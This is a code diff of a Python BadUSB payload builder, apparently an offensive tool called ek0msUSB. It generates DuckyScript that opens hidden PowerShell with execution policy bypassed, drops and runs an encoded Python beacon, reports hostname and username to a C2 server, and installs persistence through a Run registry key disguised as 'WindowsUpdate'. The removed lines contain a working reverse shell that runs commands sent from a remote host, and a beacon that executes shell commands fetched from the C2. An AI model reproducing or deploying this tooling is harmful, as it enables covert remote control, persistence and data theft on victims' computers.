@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ek0msUSB Payload Builder - Creates BadUSB payloads with direct beacon generation
+ek0msUSB Payload Builder - Creates BadUSB payloads with generated beacons
 """
 
 import os
@@ -23,285 +23,111 @@ class PayloadBuilder:
             'advanced': 'Advanced beacon with command execution'
         }
 
-    def _generate_beacon_source(self, beacon_type='simple', c2_url=None, reverse_shell=None):
-        """Generate beacon Python source code directly (no external file)"""
+    def _compile_beacon(self, beacon_type='simple', c2_url=None):
+        """Generate and compile a beacon to EXE with fallback"""
         if not c2_url:
             raise ValueError("C2 URL is required")
         
-        # Reverse shell code
-        rev_shell_code = ""
-        if reverse_shell and reverse_shell.get('enabled'):
-            rhost = reverse_shell.get('rhost')
-            rport = reverse_shell.get('rport', 4444)
-            
-            rev_shell_code = f'''
-def start_reverse_shell():
-    """Security testing component"""
-    import threading
-    import socket
-    import subprocess
-    import time
-    
-    def reverse_shell_worker():
-        while True:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect(("{rhost}", {rport}))
-                s.send(b"Security Test")
-                
-                while True:
-                    command = s.recv(1024).decode("utf-8", errors="ignore").strip()
-                    if not command:
-                        break
-                    if command.lower() == "exit":
-                        s.close()
-                        return
-                    try:
-                        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
-                        s.send(result)
-                    except Exception as e:
-                        s.send(f"Error: {{str(e)}}".encode())
-            except Exception:
-                time.sleep(30)
-    
-    thread = threading.Thread(target=reverse_shell_worker, daemon=True)
-    thread.start()
-    return thread
-
-rev_shell_thread = start_reverse_shell()
-'''
-        
-        if beacon_type == 'simple':
-            return f'''#!/usr/bin/env python3
-import requests
-import platform
-import os
-import time
-from datetime import datetime
-
-{rev_shell_code}
-
-def main():
-    c2_url = "{c2_url}"
-    while True:
         try:
-            system_info = {{
-                "hostname": platform.node(),
-                "username": os.getenv("USERNAME"),
-                "timestamp": datetime.now().isoformat(),
-                "reverse_shell": {str(reverse_shell is not None and reverse_shell.get('enabled', False)).lower()}
-            }}
-            requests.post(f"{{c2_url}}/beacon", json=system_info, timeout=10)
-        except:
-            pass
-        time.sleep(60)
-
-if __name__ == "__main__":
-    main()
-'''
-        
-        elif beacon_type == 'stealth':
-            return f'''#!/usr/bin/env python3
-import requests
-import platform
-import os
-import time
-
-{rev_shell_code}
-
-def main():
-    c2_url = "{c2_url}"
-    while True:
-        try:
-            info = {{
-                "hostname": platform.node(),
-                "username": os.getenv("USERNAME"),
-                "reverse_shell": {str(reverse_shell is not None and reverse_shell.get('enabled', False)).lower()}
-            }}
-            requests.post(f"{{c2_url}}/beacon", json=info, timeout=15)
-        except:
-            pass
-        time.sleep(120)
-
-if __name__ == "__main__":
-    main()
-'''
-        
-        else:  # advanced
-            return f'''#!/usr/bin/env python3
-import requests
-import platform
-import os
-import time
-import subprocess
-
-{rev_shell_code}
-
-class AdvancedBeacon:
-    def __init__(self, c2_url):
-        self.c2_url = c2_url
-        self.beacon_id = platform.node() + "_" + os.getenv("USERNAME")
-    
-    def check_for_commands(self):
-        try:
-            response = requests.get(f"{{self.c2_url}}/commands/{{self.beacon_id}}", timeout=10)
-            if response.status_code == 200:
-                return response.json()
-        except:
-            return []
-        return []
-    
-    def execute_commands(self, commands):
-        for cmd in commands:
-            try:
-                if cmd["type"] == "shell":
-                    result = subprocess.check_output(cmd["command"], shell=True, timeout=30)
-                    self.report_result(cmd["id"], result.decode('utf-8', errors='ignore'))
-            except:
-                pass
-    
-    def report_result(self, cmd_id, result):
-        try:
-            requests.post(f"{{self.c2_url}}/results", json={{
-                "beacon_id": self.beacon_id,
-                "command_id": cmd_id,
-                "result": result,
-                "reverse_shell": {str(reverse_shell is not None and reverse_shell.get('enabled', False)).lower()}
-            }})
-        except:
-            pass
-    
-    def run(self):
-        while True:
-            commands = self.check_for_commands()
-            if commands:
-                self.execute_commands(commands)
-            time.sleep(60)
-
-def main():
-    beacon = AdvancedBeacon("{c2_url}")
-    beacon.run()
-
-if __name__ == "__main__":
-    main()
-'''
-
-    def _compile_beacon(self, beacon_type='simple', c2_url=None, reverse_shell=None):
-        """Generate and compile a beacon to EXE directly"""
-        if not c2_url:
-            raise ValueError("C2 URL is required")
-        
-        # Generate Python source directly
-        source_code = self._generate_beacon_source(beacon_type, c2_url, reverse_shell)
-        
-        # Create temporary Python file in current directory
-        temp_dir = os.getcwd()
-        temp_py_file = os.path.join(temp_dir, f"temp_beacon_{beacon_type}.py")
-        
-        try:
-            with open(temp_py_file, 'w') as f:
-                f.write(source_code)
+            # Use the beacon generator with fallback
+            from generators.beacon_generator import BeaconGenerator
+            beacon_gen = BeaconGenerator()
             
-            output_path = f"beacon_{beacon_type}.exe"
+            # This will try PyInstaller first, then fallback to Python
+            beacon_path = beacon_gen.compile_beacon(beacon_type, c2_url)
             
-            # Use PyInstaller to compile
-            import subprocess
-            console_setting = '--console' if beacon_type == 'simple' else '--noconsole'
-            
-            # Try different PyInstaller commands
-            commands_to_try = [
-                ['pyinstaller', '--onefile', console_setting, '--name', f'beacon_{beacon_type}', temp_py_file],
-                ['python', '-m', 'PyInstaller', '--onefile', console_setting, '--name', f'beacon_{beacon_type}', temp_py_file],
-                ['py', '-m', 'PyInstaller', '--onefile', console_setting, '--name', f'beacon_{beacon_type}', temp_py_file]
-            ]
-            
-            for cmd in commands_to_try:
-                try:
-                    print(f"[*] Trying: {' '.join(cmd)}")
-                    result = subprocess.run(cmd, capture_output=True, text=True, cwd=temp_dir)
-                    
-                    if result.returncode == 0:
-                        # Check for output file
-                        dist_file = os.path.join('dist', output_path)
-                        if os.path.exists(dist_file):
-                            return dist_file
-                        elif os.path.exists(output_path):
-                            return output_path
-                        else:
-                            continue  # Try next command
-                    else:
-                        print(f"[-] Command failed: {result.stderr}")
-                        continue
-                except Exception as e:
-                    print(f"[-] Command error: {e}")
-                    continue
-            
-            raise Exception("All PyInstaller commands failed")
+            if beacon_path.endswith('.exe'):
+                print(f"[+] Using compiled EXE beacon: {beacon_path}")
+                return beacon_path, 'exe'
+            else:
+                print(f"[+] Using Python-based beacon: {beacon_path}")
+                return beacon_path, 'python'
                 
         except Exception as e:
-            print(f"Compilation error: {e}")
+            print(f"[-] Beacon generation failed: {e}")
             raise
-        finally:
-            # Clean up temporary file
-            if os.path.exists(temp_py_file):
-                try:
-                    os.unlink(temp_py_file)
-                except:
-                    pass
+
+    def _handle_python_beacon(self, beacon_path, beacon_type, c2_url):
+        """Handle Python beacon payload generation"""
+        # Read the encoded Python beacon from the file
+        with open(beacon_path, 'r') as f:
+            lines = f.readlines()
+            encoded_python = None
+            for line in lines:
+                if line.startswith('ENCODED_BEACON='):
+                    encoded_python = line.split('=')[1].strip()
+                    break
+        
+        if not encoded_python:
+            raise Exception("Could not extract encoded Python beacon from file")
+        
+        return encoded_python
 
     def build_badusb_script(self, beacon_type='simple', payload_type='in_memory', 
-                           output_name="WindowsUpdate", c2_url=None, reverse_shell=None):
-        """Build complete BadUSB DuckyScript with reverse shell option"""
+                           output_name="WindowsUpdate", c2_url=None):
+        """Build complete BadUSB DuckyScript with generated beacon"""
         
         if not c2_url or c2_url == "YOUR_C2_SERVER_URL_HERE":
             raise ValueError("C2 URL must be specified")
         
         print(f"[*] Generating {beacon_type} beacon for C2: {c2_url}")
-        if reverse_shell and reverse_shell.get('enabled'):
-            print(f"[+] Reverse shell: {reverse_shell.get('rhost')}:{reverse_shell.get('rport')}")
         
-        # Generate and compile the beacon WITH reverse shell
-        beacon_exe_path = self._compile_beacon(beacon_type, c2_url, reverse_shell)
+        # Generate the beacon (EXE or Python)
+        beacon_path, beacon_format = self._compile_beacon(beacon_type, c2_url)
         
-        if not beacon_exe_path or not os.path.exists(beacon_exe_path):
-            raise Exception(f"Failed to generate beacon: {beacon_exe_path}")
+        if not beacon_path or not os.path.exists(beacon_path):
+            raise Exception(f"Failed to generate beacon: {beacon_path}")
         
         try:
-            # Read and encode the generated beacon
-            with open(beacon_exe_path, 'rb') as f:
-                payload_data = f.read()
-            b64_payload = base64.b64encode(payload_data).decode('utf-8')
-            
-            print(f"[+] Beacon generated successfully: {os.path.getsize(beacon_exe_path)} bytes")
-            print(f"[+] Building {payload_type} BadUSB payload...")
-            
-            # Build the script based on type
-            if payload_type == 'in_memory':
-                return self._build_in_memory_payload(b64_payload, output_name, c2_url, reverse_shell)
-            elif payload_type == 'disk_based':
-                return self._build_disk_based_payload(b64_payload, output_name, c2_url, reverse_shell)
-            else:
-                return self._build_hybrid_payload(b64_payload, output_name, c2_url, reverse_shell)
+            if beacon_format == 'exe':
+                # Read and encode the generated EXE beacon
+                with open(beacon_path, 'rb') as f:
+                    payload_data = f.read()
+                b64_payload = base64.b64encode(payload_data).decode('utf-8')
                 
-        finally:
-            # Clean up temporary beacon (keep dist file for debugging)
-            pass
+                print(f"[+] EXE beacon generated successfully: {os.path.getsize(beacon_path)} bytes")
+                print(f"[+] Building {payload_type} BadUSB payload...")
+                
+                # Build the script based on type
+                if payload_type == 'in_memory':
+                    return self._build_in_memory_exe_payload(b64_payload, output_name, c2_url)
+                elif payload_type == 'disk_based':
+                    return self._build_disk_based_exe_payload(b64_payload, output_name, c2_url)
+                else:
+                    return self._build_hybrid_exe_payload(b64_payload, output_name, c2_url)
+                    
+            else:  # python format
+                # Get the encoded Python beacon
+                encoded_python = self._handle_python_beacon(beacon_path, beacon_type, c2_url)
+                
+                print(f"[+] Python beacon generated successfully")
+                print(f"[+] Building {payload_type} BadUSB payload...")
+                
+                # Build Python-based payloads
+                if payload_type == 'in_memory':
+                    return self._build_in_memory_python_payload(encoded_python, output_name, c2_url)
+                elif payload_type == 'disk_based':
+                    return self._build_disk_based_python_payload(encoded_python, output_name, c2_url)
+                else:
+                    return self._build_hybrid_python_payload(encoded_python, output_name, c2_url)
+                
+        except Exception as e:
+            print(f"[-] Payload building failed: {e}")
+            raise
 
-    def _build_in_memory_payload(self, b64_payload, output_name, c2_url, reverse_shell=None):
-        """Build in-memory payload with C2 communication and reverse shell info"""
+    # ========== EXE-BASED PAYLOAD METHODS ==========
+
+    def _build_in_memory_exe_payload(self, b64_payload, output_name, c2_url):
+        """Build in-memory payload with EXE beacon"""
         
         # Split the payload into chunks to avoid DuckyScript limits
         payload_chunks = [b64_payload[i:i+2000] for i in range(0, len(b64_payload), 2000)]
         payload_var = f"${output_name}Payload"
         
-        # Add reverse shell info to payload header
-        reverse_shell_info = ""
-        if reverse_shell and reverse_shell.get('enabled'):
-            reverse_shell_info = f"\n# Reverse Shell: {reverse_shell.get('rhost')}:{reverse_shell.get('rport')}"
-        
-        script = f'''# ek0msUSB In-Memory Payload WITH C2{reverse_shell_info}
+        script = f'''# ek0msUSB In-Memory Payload WITH C2
 # Generated by ek0msSavi0r Framework
 # C2 URL: {c2_url}
+# Beacon Type: EXE (Compiled)
 # WARNING: For authorized testing only
 
 DELAY 3000
@@ -371,17 +197,12 @@ ENTER
 '''
         return script
 
-    def _build_disk_based_payload(self, b64_payload, output_name, c2_url, reverse_shell=None):
-        """Build traditional disk-based payload with C2 and reverse shell info"""
-        
-        # Add reverse shell info to payload header
-        reverse_shell_info = ""
-        if reverse_shell and reverse_shell.get('enabled'):
-            reverse_shell_info = f"\n# Reverse Shell: {reverse_shell.get('rhost')}:{reverse_shell.get('rport')}"
-        
-        return f'''# ek0msUSB Disk-Based Payload WITH C2{reverse_shell_info}
+    def _build_disk_based_exe_payload(self, b64_payload, output_name, c2_url):
+        """Build traditional disk-based payload with EXE beacon"""
+        return f'''# ek0msUSB Disk-Based Payload WITH C2
 # Generated by ek0msSavi0r Framework
 # C2 URL: {c2_url}
+# Beacon Type: EXE (Compiled)
 
 DELAY 3000
 GUI r
@@ -415,32 +236,162 @@ STRING "
 ENTER
 '''
 
-    def _build_hybrid_payload(self, b64_payload, output_name, c2_url, reverse_shell=None):
-        """Build hybrid payload (in-memory execution with disk backup and C2) with reverse shell info"""
-        return self._build_in_memory_payload(b64_payload, output_name, c2_url, reverse_shell)
+    def _build_hybrid_exe_payload(self, b64_payload, output_name, c2_url):
+        """Build hybrid payload with EXE beacon"""
+        return self._build_in_memory_exe_payload(b64_payload, output_name, c2_url)
+
+    # ========== PYTHON-BASED PAYLOAD METHODS ==========
+
+    def _build_in_memory_python_payload(self, encoded_python, output_name, c2_url):
+        """Build in-memory payload with Python beacon"""
+        script = f'''# ek0msUSB Python Beacon Payload
+# Generated by ek0msSavi0r Framework
+# C2 URL: {c2_url}
+# Beacon Type: Python Script
+# WARNING: For authorized testing only
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
+STRING function Start-PythonBeacon {{
+STRING     param([string]`$B64PythonCode, [string]`$C2Url)
+STRING     
+STRING     # Decode Python code
+STRING     `$pythonCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$B64PythonCode))
+STRING     
+STRING     # Write to temporary file
+STRING     `$tempDir = `$env:TEMP
+STRING     `$pythonFile = Join-Path `$tempDir \"{output_name}.py\"
+STRING     Set-Content -Path `$pythonFile -Value `$pythonCode -Encoding UTF8
+STRING     
+STRING     # Check for Python
+STRING     `$pythonExe = `$null
+STRING     if (Get-Command python -ErrorAction SilentlyContinue) {{ `$pythonExe = \"python\" }}
+STRING     elseif (Get-Command py -ErrorAction SilentlyContinue) {{ `$pythonExe = \"py\" }}
+STRING     else {{
+STRING         # Try to find Python in common locations
+STRING         `$possiblePaths = @(
+STRING             \"`$env:LOCALAPPDATA\\\\Programs\\\\Python\\\\Python39\\\\python.exe\",
+STRING             \"`$env:LOCALAPPDATA\\\\Programs\\\\Python\\\\Python310\\\\python.exe\", 
+STRING             \"`$env:LOCALAPPDATA\\\\Programs\\\\Python\\\\Python311\\\\python.exe\",
+STRING             \"C:\\\\Python39\\\\python.exe\",
+STRING             \"C:\\\\Python310\\\\python.exe\"
+STRING         )
+STRING         foreach (`$path in `$possiblePaths) {{
+STRING             if (Test-Path `$path) {{ `$pythonExe = `$path; break }}
+STRING         }}
+STRING     }}
+STRING     
+STRING     if (`$pythonExe) {{
+STRING         # Execute Python beacon hidden
+STRING         Start-Process -FilePath `$pythonExe -ArgumentList `$pythonFile -WindowStyle Hidden
+STRING         return `$true
+STRING     }} else {{
+STRING         # Python not found - install or use alternative
+STRING         return `$false
+STRING     }}
+STRING }}
+STRING 
+STRING function Send-Beacon {{
+STRING     param([string]`$C2Url)
+STRING     try {{
+STRING         `$systemInfo = @{{
+STRING             hostname = `$env:COMPUTERNAME
+STRING             username = `$env:USERNAME
+STRING             domain = `$env:USERDOMAIN
+STRING         }} | ConvertTo-Json
+STRING         Invoke-WebRequest -Uri \"`$C2Url/beacon\" -Method Post -Body `$systemInfo -ContentType \"application/json\" -UseBasicParsing | Out-Null
+STRING     }} catch {{ }}
+STRING }}
+STRING 
+STRING # Execute Python beacon
+STRING `$b64Code = \"{encoded_python}\"
+STRING `$success = Start-PythonBeacon -B64PythonCode `$b64Code -C2Url \"{c2_url}\"
+STRING 
+STRING # Send initial beacon
+STRING if (`$success) {{
+STRING     Start-Sleep 10
+STRING     Send-Beacon -C2Url \"{c2_url}\"
+STRING }} else {{
+STRING     # Fallback: Try to install Python or use alternative method
+STRING     Write-Host \"Python not found - consider adding auto-install logic\"
+STRING }}
+STRING "
+ENTER
+'''
+        return script
+
+    def _build_disk_based_python_payload(self, encoded_python, output_name, c2_url):
+        """Build disk-based payload with Python beacon"""
+        script = f'''# ek0msUSB Python Disk-Based Payload
+# Generated by ek0msSavi0r Framework
+# C2 URL: {c2_url}
+# Beacon Type: Python Script
+
+DELAY 3000
+GUI r
+DELAY 1000
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "
+STRING function Start-PythonBeacon {{
+STRING     param([string]`$B64PythonCode, [string]`$C2Url)
+STRING     
+STRING     # Decode and save Python beacon
+STRING     `$pythonCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(`$B64PythonCode))
+STRING     `$beaconPath = \"`$env:APPDATA\\\\Microsoft\\\\Windows\\\\{output_name}.py\"
+STRING     Set-Content -Path `$beaconPath -Value `$pythonCode -Encoding UTF8
+STRING     
+STRING     # Create batch file to run Python beacon
+STRING     `$batchContent = @\"
+STRING @echo off
+STRING chcp 65001 >nul
+STRING python \"%APPDATA%\\\\Microsoft\\\\Windows\\\\{output_name}.py\"
+STRING \"@
+STRING     `$batchPath = \"`$env:APPDATA\\\\Microsoft\\\\Windows\\\\{output_name}.bat\"
+STRING     Set-Content -Path `$batchPath -Value `$batchContent
+STRING     
+STRING     # Add to startup
+STRING     reg add \"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" /v \"{output_name}\" /t REG_SZ /d `$batchPath /f
+STRING     
+STRING     # Execute now
+STRING     Start-Process -FilePath \"python\" -ArgumentList `$beaconPath -WindowStyle Hidden
+STRING     return `$true
+STRING }}
+STRING 
+STRING function Send-Beacon {{
+STRING     param([string]`$C2Url)
+STRING     try {{
+STRING         `$systemInfo = @{{
+STRING             hostname = `$env:COMPUTERNAME
+STRING             username = `$env:USERNAME
+STRING         }} | ConvertTo-Json
+STRING         Invoke-WebRequest -Uri \"`$C2Url/beacon\" -Method Post -Body `$systemInfo -ContentType \"application/json\" -UseBasicParsing | Out-Null
+STRING     }} catch {{ }}
+STRING }}
+STRING 
+STRING # Deploy Python beacon
+STRING `$b64Code = \"{encoded_python}\"
+STRING Start-PythonBeacon -B64PythonCode `$b64Code -C2Url \"{c2_url}\"
+STRING Start-Sleep 10
+STRING Send-Beacon -C2Url \"{c2_url}\"
+STRING "
+ENTER
+'''
+        return script
+
+    def _build_hybrid_python_payload(self, encoded_python, output_name, c2_url):
+        """Build hybrid payload with Python beacon"""
+        return self._build_in_memory_python_payload(encoded_python, output_name, c2_url)
 
 # Test function
 def test_builder():
-    """Test the payload builder with generated beacon and reverse shell"""
+    """Test the payload builder with generated beacon"""
     builder = PayloadBuilder()
     
     try:
-        # Test without reverse shell
-        print("Testing without reverse shell...")
         script = builder.build_badusb_script('simple', 'in_memory', c2_url="http://localhost:5000")
         print("Payload built successfully!")
-        
-        # Test with reverse shell
-        print("\nTesting WITH reverse shell...")
-        reverse_config = {
-            'enabled': True,
-            'rhost': '192.168.1.100', 
-            'rport': 4444
-        }
-        script_with_rev = builder.build_badusb_script('simple', 'in_memory', c2_url="http://localhost:5000", reverse_shell=reverse_config)
-        print("Payload with reverse shell built successfully!")
-        
-        return script_with_rev
+        return script
     except Exception as e:
         print(f"Error building payload: {e}")
         return None
@@ -452,8 +403,6 @@ if __name__ == "__main__":
     parser.add_argument('--payload-type', choices=['in_memory', 'disk_based', 'hybrid'], default='in_memory', help='Delivery method')
     parser.add_argument('--output-name', default='WindowsUpdate', help='Output name for persistence')
     parser.add_argument('--c2-url', required=True, help='C2 server URL')
-    parser.add_argument('--reverse-shell-host', help='Reverse shell host (IP/hostname)')
-    parser.add_argument('--reverse-shell-port', type=int, default=4444, help='Reverse shell port (default: 4444)')
     parser.add_argument('--output-file', default='payload.txt', help='Output DuckyScript file')
     
     args = parser.parse_args()
@@ -462,24 +411,12 @@ if __name__ == "__main__":
         test_builder()
     else:
         builder = PayloadBuilder()
-        
-        # Build reverse shell config if provided
-        reverse_shell_config = None
-        if args.reverse_shell_host:
-            reverse_shell_config = {
-                'enabled': True,
-                'rhost': args.reverse_shell_host,
-                'rport': args.reverse_shell_port
-            }
-            print(f"[*] Reverse shell enabled: {args.reverse_shell_host}:{args.reverse_shell_port}")
-        
         try:
             script = builder.build_badusb_script(
                 args.beacon_type, 
                 args.payload_type, 
                 args.output_name, 
-                args.c2_url,
-                reverse_shell_config
+                args.c2_url
             )
             with open(args.output_file, 'w') as f:
                 f.write(script)
@@ -487,7 +424,5 @@ if __name__ == "__main__":
             print(f"[+] Beacon Type: {args.beacon_type}")
             print(f"[+] Delivery Method: {args.payload_type}")
             print(f"[+] C2 URL: {args.c2_url}")
-            if reverse_shell_config:
-                print(f"[+] Reverse Shell: {args.reverse_shell_host}:{args.reverse_shell_port}")
         except Exception as e:
             print(f"[-] Error: {e}")
